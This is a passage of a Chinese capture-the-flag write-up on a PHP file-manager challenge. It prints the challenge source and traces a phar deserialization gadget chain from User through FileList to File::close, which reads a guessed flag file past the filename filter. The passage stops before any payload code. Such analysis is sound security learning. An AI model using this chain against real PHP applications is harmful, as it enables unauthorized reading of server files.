class="title">breadcrumb</span>-<span class="title">item</span> <span class="title">active</span>&quot;&gt;管理面板&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">li</span> <span class="title">class</span>=&quot;<span class="title">breadcrumb</span>-<span class="title">item</span> <span class="title">active</span>&quot;&gt;&lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">fileInput</span>&quot; <span class="title">class</span>=&quot;<span class="title">fileLabel</span>&quot;&gt;上传文件&lt;/<span class="title">label</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">li</span> <span class="title">class</span>=&quot;<span class="title">active</span> <span class="title">ml</span>-<span class="title">auto</span>&quot;&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;#&quot;&gt;你好 &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">_SESSION</span>[&#x27;<span class="title">username</span>&#x27;]?&gt;&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">ol</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">nav</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">file</span>&quot; <span class="title">id</span>=&quot;<span class="title">fileInput</span>&quot; <span class="title">class</span>=&quot;<span class="title">hidden</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">top</span>&quot; <span class="title">id</span>=&quot;<span class="title">toast</span>-<span class="title">container</span>&quot;&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class"><span class="title">include</span> &quot;<span class="title">class</span>.<span class="title">php</span>&quot;;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">$<span class="title">a</span> = <span class="title">new</span> <span class="title">FileList</span>($<span class="title">_SESSION</span>[&#x27;<span class="title">sandbox</span>&#x27;]);</span></span><br><span class="line"><span class="class">$<span class="title">a</span>-&gt;<span class="title">Name</span>();</span></span><br><span class="line"><span class="class">$<span class="title">a</span>-&gt;<span class="title">Size</span>();</span></span><br><span class="line"><span class="class">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>看到class.php，九成九就是个反序列化题了，来读取看看</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$dbaddr</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="variable">$dbuser</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbpass</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;dropbox&quot;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$dbaddr</span>, <span class="variable">$dbuser</span>, <span class="variable">$dbpass</span>, <span class="variable">$dbname</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db = <span class="variable">$db</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user_exist</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">store_result</span>();</span><br><span class="line">        <span class="variable">$count</span> = <span class="variable">$stmt</span>-&gt;num_rows;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$count</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">user_exist</span>(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;ss&quot;</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">user_exist</span>(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_result</span>(<span class="variable">$expect</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$expect</span>) &amp;&amp; <span class="variable">$expect</span> === <span class="variable">$password</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$filenames</span> = <span class="title function_ invoke__">scandir</span>(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;..&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$filenames</span> <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line">            <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$path</span> . <span class="variable">$filename</span>);</span><br><span class="line">            <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;files, <span class="variable">$file</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()] = <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;funcs, <span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$table</span> = <span class="string">&#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;thead&gt;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;funcs <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$func</span>) . <span class="string">&#x27;&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;results <span class="keyword">as</span> <span class="variable">$filename</span> =&gt; <span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$func</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$value</span>) . <span class="string">&#x27;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$filename</span>) . <span class="string">&#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/tr&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$table</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) &amp;&amp; !<span class="title function_ invoke__">is_dir</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">name</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">basename</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">size</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$size</span> = <span class="title function_ invoke__">filesize</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="variable">$units</span> = <span class="keyword">array</span>(<span class="string">&#x27; B&#x27;</span>, <span class="string">&#x27; KB&#x27;</span>, <span class="string">&#x27; MB&#x27;</span>, <span class="string">&#x27; GB&#x27;</span>, <span class="string">&#x27; TB&#x27;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$size</span> &gt;= <span class="number">1024</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="number">4</span>; <span class="variable">$i</span>++) <span class="variable">$size</span> /= <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">round</span>(<span class="variable">$size</span>, <span class="number">2</span>).<span class="variable">$units</span>[<span class="variable">$i</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detele</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>phar反序列化，首先会获取sandbox下的所有文件名，然后访问对应文件的名字和size，调用这两个方法，链子最终应该是<code>close()</code>进行文件内容的读取，而调用<code>close()</code>的地方只有一个，那就是User的<code>__destruct()</code>方法，控制db为file对象即可，但是好像没什么用，并不知道flag文件名叫什么，还是要进行系统函数的执行才可以，可以看下另一条链子，实例化完了<code>FileList</code>对象会访问<code>Name</code>和<code>Size</code>方法，这两个方法并不存在于<code>FileList</code>，而在<code>File</code>里面，所以会触发<code>__call()</code>，而<code>__call()</code>会调用file内的<code>func</code>，并将结果存入<code>$results</code>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br></pre></td></tr></table></figure>

<p>链子分析到这里，感觉还是不太明朗，读取download.php看下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="title function_ invoke__">getcwd</span>() . <span class="string">&quot;:/etc:/tmp&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line"><span class="variable">$filename</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$filename</span>) &amp;&amp; <span class="title function_ invoke__">stristr</span>(<span class="variable">$filename</span>, <span class="string">&quot;flag&quot;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/octet-stream&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-Disposition: attachment; filename=&quot;</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;File not exist&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>通过这个我们就能知道，存在一个waf，无法直接读取flag，所以我们最终要利用的还是<code>file_get_contents()</code>，那也就是要触发<code>close()</code>，那么就是点击下载按钮，但是其实存在<code>open_basedir</code>这个点：</p>
<p>open_basedir 将php所能打开的文件限制在指定的目录树中，包括文件本身。当程序要使用例如fopen()或file_get_contents()等系统函数打开一个文件时，这个文件的位置将会被检查。当文件在指定的目录树之外，程序将拒绝打开</p>
<p>如果设置为</p>
<p>ini_set(“open_basedir”,&#x2F;var)</p>
<p>那么就是限制前缀，可以使用任意后缀 ：&#x2F;var1 &#x2F;var&#x2F;www &#x2F;varsda&#x2F;…&#x2F;</p>
<p>如果是</p>
<p>ini_set(“open_basedir”,&#x2F;var&#x2F;)</p>
<p>那么就是限制了目录，只能使用此目录的文件： &#x2F;var&#x2F;www&#x2F;</p>
<p>那么download.php是没法利用的，来看看delete.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line"><span class="variable">$filename</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">    <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">detele</span>();</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">    <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">true</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$response</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">    <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">false</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;File not exist&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$response</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>它include是在chdir之前的，所以能够触发我们的链子，这样一看，其实就很简单了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User()-&gt;db-&gt;FileList()-&gt;file-&gt;__call()-&gt;File()-&gt;filename=&quot;flag.txt&quot;</span><br></pre></td></tr></table></figure>

<p>这里的flag.txt是猜测，只能这样解释了，主要集中注意到反序列化上吧，还是那句话，构造函数<code>__construct()</code>是我们可以控制重写的：</p>
